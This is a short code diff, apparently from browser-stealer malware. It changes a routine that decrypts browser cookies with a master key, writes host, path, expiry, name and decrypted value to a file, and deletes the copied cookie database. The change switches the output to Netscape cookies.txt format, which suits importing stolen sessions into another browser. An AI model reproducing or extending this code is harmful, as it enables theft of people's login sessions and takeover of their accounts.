@@ -129,7 +129,7 @@ class Browsers:
                 host_key, name, path, encrypted_value, expires_utc = res
                 value = self.decrypt_password(encrypted_value, self.masterkey)
                 if host_key and name and value != "":
-                    f.write(f"Host: {host_key}\t\nName: {name}\t\nValue: {value}\n\n")
+                    f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
         cursor.close()
         conn.close()
         os.remove(cookievault)
